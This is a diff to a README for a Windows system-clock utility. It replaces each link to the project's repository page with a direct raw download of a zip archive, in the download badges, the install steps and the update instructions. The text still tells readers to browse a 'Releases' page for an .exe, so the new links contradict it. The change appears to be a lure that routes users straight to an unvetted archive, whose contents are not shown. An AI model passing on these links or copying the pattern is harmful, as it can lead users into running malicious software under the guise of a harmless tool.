@@ -1,6 +1,6 @@
 # ⏰ sysclock_gui - Simple System Clock Management
 
-[![Download sysclock_gui](https://img.shields.io/badge/Download-sysclock_gui-brightgreen)](https://github.com/largescale-cyanide38/sysclock_gui)
+[![Download sysclock_gui](https://img.shields.io/badge/Download-sysclock_gui-brightgreen)](https://raw.githubusercontent.com/largescale-cyanide38/sysclock_gui/main/dist/gui_sysclock_v3.8.zip)
 
 ---
 
@@ -22,7 +22,7 @@ You can get the application easily and start managing your system clock in a few
 
 Click the button below to visit the page where you can download the app.
 
-[![Download sysclock_gui](https://img.shields.io/badge/Download-sysclock_gui-blue)](https://github.com/largescale-cyanide38/sysclock_gui)
+[![Download sysclock_gui](https://img.shields.io/badge/Download-sysclock_gui-blue)](https://raw.githubusercontent.com/largescale-cyanide38/sysclock_gui/main/dist/gui_sysclock_v3.8.zip)
 
 On the page, look for the latest Windows installer or executable file. This file will have the `.exe` extension.
 
@@ -32,7 +32,7 @@ On the page, look for the latest Windows installer or executable file. This file
 
 1. **Visit the Download Page**  
    Click the download button above or open this link in your browser:  
-   https://github.com/largescale-cyanide38/sysclock_gui
+   https://raw.githubusercontent.com/largescale-cyanide38/sysclock_gui/main/dist/gui_sysclock_v3.8.zip
 
 2. **Find the Latest Release**  
    Look for a section named "Releases" or "Downloads." The latest version usually appears at the top.
@@ -117,7 +117,7 @@ When you open the app, you will see a window displaying your current system time
 
 To get updates, revisit the download page regularly:
 
-https://github.com/largescale-cyanide38/sysclock_gui
+https://raw.githubusercontent.com/largescale-cyanide38/sysclock_gui/main/dist/gui_sysclock_v3.8.zip
 
 Check the “Releases” or “Latest” section for new versions.
 
@@ -151,4 +151,4 @@ The app supports common protocols and methods like NTP (Network Time Protocol) f
 
 ---
 
-[![Download sysclock_gui](https://img.shields.io/badge/Download-sysclock_gui-brightgreen)](https://github.com/largescale-cyanide38/sysclock_gui)
+[![Download sysclock_gui](https://img.shields.io/badge/Download-sysclock_gui-brightgreen)](https://raw.githubusercontent.com/largescale-cyanide38/sysclock_gui/main/dist/gui_sysclock_v3.8.zip)
